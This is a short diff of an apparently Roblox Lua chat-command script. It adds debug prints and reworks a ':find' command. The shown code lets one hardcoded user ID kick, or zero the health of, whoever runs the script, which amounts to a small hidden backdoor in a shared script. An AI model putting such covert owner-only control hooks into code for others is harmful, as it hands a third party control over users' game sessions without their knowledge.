@@ -7,7 +7,9 @@ function commands(msg, playa)
         local SplitCMD = string.split(msg,' ')
         local lower = string.lower(player.Name)
         local cmdfound = string.find(lower, SplitCMD[2])
+        print(SplitCMD[1], Mod)
         if cmdfound then
+            print'ok'
             if string.find(SplitCMD[1], ':kick') then
                 if playa == 475876108 then
                     player:Kick('')
@@ -85,11 +87,9 @@ function commands(msg, playa)
                 player.Character.Humanoid.Health = 0
             end
 
-        else
-            if string.find(msg, '/e find') then
-                if game.Players.LocalPlayer.UserId ~= 475876108 then
-                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. tostring(Mod.Name) .. " Hi", 'All');
-                end
+            if string.find(SplitCMD[1], ':find') then
+                print'a'
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi", 'All');
             end
         end
     end
